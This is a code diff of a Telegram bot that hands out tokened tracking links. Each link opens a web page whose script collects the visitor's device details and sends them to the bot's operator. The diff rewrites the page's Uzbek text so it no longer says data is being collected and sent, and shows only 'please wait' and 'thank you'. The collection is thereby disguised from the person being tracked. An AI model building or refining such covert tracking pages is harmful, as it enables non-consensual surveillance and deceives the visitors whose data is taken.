@@ -38,7 +38,7 @@ USER_TOKENS = {}  # token -> telegram_id
 
 # ---------------- Telegram Handlers ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 Salom! /tracklink buyrug'ini yuboring.")
+    await update.message.reply_text(" Test /tracklink")
 
 async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -57,8 +57,8 @@ async def track_page(request):
         return web.Response(text="❌ Noto'g'ri yoki eskirgan havola.", status=403)
 
     html = f"""
-    <html><head><title>Ma'lumot yig'ilmoqda...</title></head><body>
-    <h2>Ma'lumotlar yig'ilmoqda...</h2>
+    <html><head><title>Jgarim</title></head><body>
+    <h2>Iltimos Kuting...</h2>
     <script>
       async function collect() {{
         const data = {{
@@ -152,7 +152,7 @@ async def track_page(request):
           headers: {{ 'Content-Type': 'application/json' }},
           body: JSON.stringify({{ token: '{token}', ...data }})
         }}).then(() => {{
-          document.body.innerHTML = '<h2>✅ Ma\\'lumotlar yuborildi!</h2>';
+          document.body.innerHTML = '<h2>✅ Rahmat!</h2>';
         }});
       }}
       collect();
@@ -174,7 +174,7 @@ async def submit_data(request):
         utc_str = f"+{int(utc_offset):02}" if utc_offset >= 0 else f"{int(utc_offset):02}"
 
         message = f"""
-Kichik eslatma link telegram orqali ochilsa
+Test
 
 Qurilma ma'lumoti
 {data.get('timestamp', 'Noma\'lum')}
